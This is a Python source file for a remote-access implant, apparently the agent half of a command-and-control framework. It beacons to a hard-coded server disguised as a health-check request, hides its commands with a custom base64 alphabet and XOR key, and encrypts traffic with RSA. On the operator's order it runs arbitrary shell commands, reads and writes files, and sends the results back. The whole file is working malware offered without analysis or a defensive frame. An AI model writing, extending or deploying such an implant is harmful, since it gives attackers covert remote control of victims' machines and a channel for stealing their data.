import json, time, random, requests, subprocess, base64, os
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend
from flask import jsonify


# Obfuscation keys
CUSTOM_ABC = "zxywvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA0123456789-_"
STD_ABC    = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
XOR_KEY    = "C2_SECRET_KEY"

SERVER_IP = "10.37.1.249"

def custom_b64_e(data):
   if isinstance(data, str): data = data.encode()
   encoded = base64.b64encode(data).decode().replace('=', '')
   return encoded.translate(str.maketrans(STD_ABC, CUSTOM_ABC))


def custom_b64_d(data):
   decoded = data.translate(str.maketrans(CUSTOM_ABC, STD_ABC))
   return base64.b64decode(decoded + '=' * (-len(decoded) % 4)).decode()


def xor_decode(hex_data):
   data = bytes.fromhex(hex_data).decode()
   return ''.join(chr(ord(data[i]) ^ ord(XOR_KEY[i % len(XOR_KEY)])) for i in range(len(data)))


# RSA Key Management
def _init_keys():
   try:
       with open('ssh_private_key.pem', 'rb') as f:
           priv = serialization.load_pem_private_key(f.read(), None, default_backend())
       with open('ssh_public_key.pem', 'rb') as f:
           pub = serialization.load_pem_public_key(f.read(), default_backend())
   except FileNotFoundError:
       priv = rsa.generate_private_key(65537, 2048, default_backend())
       pub = priv.public_key()
       with open('ssh_private_key.pem', 'wb') as f: f.write(priv.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
       with open('ssh_public_key.pem', 'wb') as f: f.write(pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo))
   return priv, pub


def _load_server_key():
   with open('server_public_key.pem', 'rb') as f: return serialization.load_pem_public_key(f.read(), default_backend())


PRIV, PUB = _init_keys()
S_PUB = _load_server_key()
AID = os.urandom(4).hex()
RUNNING = True
SLEEP_MIN, SLEEP_MAX = 5, 10


def enc_s(d):
   if isinstance(d, str): d = d.encode()
   return base64.b64encode(S_PUB.encrypt(d, padding.OAEP(padding.MGF1(hashes.SHA256()), hashes.SHA256(), None))).decode()


def dec_s(d):
   return PRIV.decrypt(base64.b64decode(d), padding.OAEP(padding.MGF1(hashes.SHA256()), hashes.SHA256(), None)).decode()


# Standardized error response
def error_response(code, message, request_id=None, status_code=400):
   return jsonify({"status": "ERROR", "code": code, "message": message, "request_id": request_id}), status_code


# Beacon function for agent check-in and task retrieval
def beacon():
   pub_pem = PUB.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo).decode()
   headers = {"X-Agent-Key": custom_b64_e(pub_pem), "User-Agent": "Mozilla/5.0"}
   payload = enc_s(json.dumps({"a": AID, "r": os.urandom(4).hex()}))
   try:
       r = requests.post(f"http://{SERVER_IP}:3000/api/health", json={"data": payload}, headers=headers)
       if r.status_code == 200:
           resp = json.loads(dec_s(r.json().get("data")))
           if resp.get("t"): execute_task(resp["t"])
   except Exception as e:
       error_response(500, f"Beacon error: {str(e)}")


# Task execution based on command type
def execute_task(t):
   global SLEEP_MIN, SLEEP_MAX, RUNNING
   cmd = xor_decode(t["c"])
   rid = t["r"]
   p = t["p"]
   out = ""
   try:
       if cmd == "RUN_CMD":
           out = subprocess.check_output(p["cmd"], shell=True, stderr=subprocess.STDOUT).decode()
       elif cmd == "READ_DATA":
           with open(p["path"], 'r') as f: out = f.read()
       elif cmd == "WRITE_DATA":
           with open(p["path"], 'w') as f: f.write(p["val"])
           out = "File written successfully."
       elif cmd == "SET_SLEEP":
           SLEEP_MIN, SLEEP_MAX = p.get("min", 5), p.get("max", 10)
           out = f"Sleep updated to {SLEEP_MIN}-{SLEEP_MAX}s"
       elif cmd == "SHUTDOWN":
           out = "Agent shutting down."; RUNNING = False
   except Exception as e: error_response(500, f"Task execution error: {str(e)}", request_id=rid)
  
   rep = enc_s(json.dumps({"a": AID, "r": rid, "o": custom_b64_e(out[:120])}))
   requests.post(f"http://{SERVER_IP}:3000/api/report", json={"data": rep})


if __name__ == "__main__":
   print(f"Agent {AID} online.")
   while RUNNING:
       beacon()
       if RUNNING: time.sleep(random.randint(SLEEP_MIN, SLEEP_MAX))
